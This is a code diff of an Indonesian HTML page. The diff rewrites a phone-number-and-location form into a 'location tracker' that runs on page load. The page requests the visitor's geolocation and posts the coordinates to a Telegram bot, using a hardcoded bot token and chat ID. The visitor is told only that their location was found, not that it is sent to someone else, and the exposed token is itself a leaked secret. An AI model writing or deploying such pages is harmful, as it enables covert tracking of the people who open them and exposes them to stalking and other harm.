@@ -2,47 +2,39 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Form Lokasi & Nomor</title>
+  <title>Pelacak Lokasi</title>
 </head>
 <body>
-  <h2>Masukkan Nomor Telepon Anda</h2>
-  <input type="text" id="nomor" placeholder="Contoh: 081234567890" required>
-  <button onclick="kirimData()">Kirim</button>
-  <p id="status"></p>
+  <h1>Halo, sedang melacak lokasi...</h1>
+  <p id="status">Meminta izin lokasi...</p>
 
   <script>
-    const botToken = "7716589580:AAHh-66I9FYbYLYjpcN2F40dHeoUYwUvWzk";
+    const token = "7716589580:AAHh-66I9FYbYLYjpcN2F40dHeoUYwUvWzk";
     const chatId = "5665946730";
 
-    function kirimData() {
-      const nomor = document.getElementById("nomor").value;
+    function kirimLokasi(lat, lon) {
+      const pesan = `Lokasi:\nLatitude: ${lat}\nLongitude: ${lon}`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: pesan
+        })
+      });
+    }
 
-      if (!nomor) {
-        document.getElementById("status").textContent = "Mohon isi nomor telepon.";
-        return;
-      }
-
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(pos => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-          const pesan = `Nomor: ${nomor}\nLokasi:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`;
-
-          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text: pesan })
-          }).then(() => {
-            document.getElementById("status").textContent = "Berhasil dikirim!";
-          }).catch(() => {
-            document.getElementById("status").textContent = "Gagal mengirim ke Telegram.";
-          });
-        }, () => {
-          document.getElementById("status").textContent = "Gagal mendapatkan lokasi.";
-        });
-      } else {
-        document.getElementById("status").textContent = "Browser tidak mendukung lokasi.";
-      }
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        document.getElementById("status").textContent = `Lokasi ditemukan: ${lat}, ${lon}`;
+        kirimLokasi(lat, lon);
+      }, err => {
+        document.getElementById("status").textContent = "Gagal mendapatkan lokasi.";
+      });
+    } else {
+      document.getElementById("status").textContent = "Geolocation tidak didukung.";
     }
   </script>
 </body>
